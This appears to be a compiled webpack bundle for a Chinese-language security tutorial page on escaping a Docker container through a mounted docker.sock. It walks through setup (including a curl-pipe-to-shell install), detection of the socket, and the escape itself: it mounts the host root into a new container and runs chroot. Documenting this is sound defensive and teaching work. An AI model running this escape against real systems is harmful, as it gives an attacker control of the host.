(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{808:function(s,a,e){"use strict";e.r(a);var t=e(112),r=Object(t.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("center",[e("h1",[s._v("挂载 Docker Socket 逃逸")])]),s._v(" "),e("hr"),s._v(" "),e("p",[s._v("Docker Socket 用来与守护进程通信即查询信息或者下发命令。")]),s._v(" "),e("h1",{attrs:{id:"搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#搭建"}},[s._v("#")]),s._v(" 搭建")]),s._v(" "),e("p",[s._v("创建一个容器并挂载 /var/run/docker/sock 文件")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("在容器内安装 Docker 命令行客户端")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("docker exec -it with_docker_sock /bin/bash\napt-get update\napt-get install curl\ncurl -fsSL https://get.docker.com/ | sh\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("h1",{attrs:{id:"检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#检测"}},[s._v("#")]),s._v(" 检测")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("ls -lah /var/run/docker.sock\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("如果存在这个文件，说明漏洞可能存在")]),s._v(" "),e("h1",{attrs:{id:"复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#复现"}},[s._v("#")]),s._v(" 复现")]),s._v(" "),e("p",[s._v("在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("docker run -it -v /:/host ubuntu /bin/bash\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("img",{attrs:{width:"1200",src:"/img/1650014060.png"}}),s._v(" "),e("p",[s._v("在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录，其实不挂载也行")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("chroot /host\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("Vssue")],1)}),[],!1,null,null,null);a.default=r.exports}}]);